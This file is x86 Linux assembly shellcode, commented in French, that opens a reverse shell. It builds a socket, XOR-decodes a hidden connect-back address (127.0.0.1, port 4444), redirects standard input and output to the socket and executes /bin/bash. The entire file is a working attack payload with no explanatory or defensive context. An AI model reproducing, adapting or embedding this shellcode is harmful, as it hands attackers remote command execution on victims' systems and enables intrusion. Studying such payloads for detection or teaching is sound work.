global _start

section .text

_start:

   
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

 
    mov al, 0x66        ; call sys_socket
    mov bl, 0x1         ; SYS_SOCKET
    push 0x6            
    push 0x1            
    push 0x2            
    mov ecx, esp
    int 0x80            
    mov edi, eax        

 
    mov eax, 0xfeffff80 ; 127.0.0.1 en XOR
    mov ebx, 0xffffffff ; clé XOR
    xor eax, ebx        
    push edx            
    push edx           
    push eax            ; 127.0.0.1
    push word 0x5c11    ; Port 4444
    push word 0x2       ; AF_INET
    mov esi, esp

    ; Connexion du socket
    xor eax, eax
    xor ebx, ebx
    mov al, 0x66        ; call sys_socket
    mov bl, 0x3         ; SYS_CONNECT
    push 0x10          
    push esi           
    push edi           
    mov ecx, esp
    int 0x80


    xor ecx, ecx
    mov cl, 0x3         
    mov ebx, edi       

    dup2:
    mov al, 0x3f      
    dec ecx
    int 0x80         
    inc ecx
    loop dup2

    xor eax, eax
    push 0x41687361     
    push 0x622f6e69
    push 0x622f2f2f
    mov byte [esp + 11], al
    mov al, 0xb
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
